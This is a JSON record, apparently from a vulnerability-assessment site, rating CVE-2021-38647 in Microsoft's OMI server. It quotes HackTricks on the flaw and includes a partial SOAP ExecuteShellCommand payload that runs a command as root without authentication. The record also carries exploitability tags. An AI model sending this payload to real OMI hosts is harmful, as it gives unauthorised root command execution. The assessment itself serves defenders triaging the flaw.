      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "0802ecee-bb4c-4c5b-969c-32cb9808c281",
      "created": "2022-03-31T20:33:33.723675Z",
      "revisionDate": "2022-03-31T20:33:33.722759Z",
      "document": "[HackTricks](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-omi#cve-2021-38647)\r\n\r\n> The OMI server receives configuration management messages via the /wsman endpoint. Typically, an Authentication header is passed along with the message and the OMI server will ensure the client is authorized communicate. In this case the vulnerability is that when there is no Authentication header the server incorrectly accepts the message and executes the instruction under the root user.\r\n>\r\n> By posting an \u201cExecuteShellCommand\u201d SOAP payload to the server with no Authentication header specified, it will execute the command as root.\r\n>\r\n> ```xml\r\n> <s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\"\r\n>    ...\r\n>    <s:Body>\r\n>       <p:ExecuteShellCommand_INPUT xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">\r\n>          <p:command>id</p:command>\r\n>          <p:timeout>0</p:timeout>\r\n>       </p:ExecuteShellCommand_INPUT>\r\n>    </s:Body>\r\n> </s:Envelope>\r\n> ```\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    }
  ]
}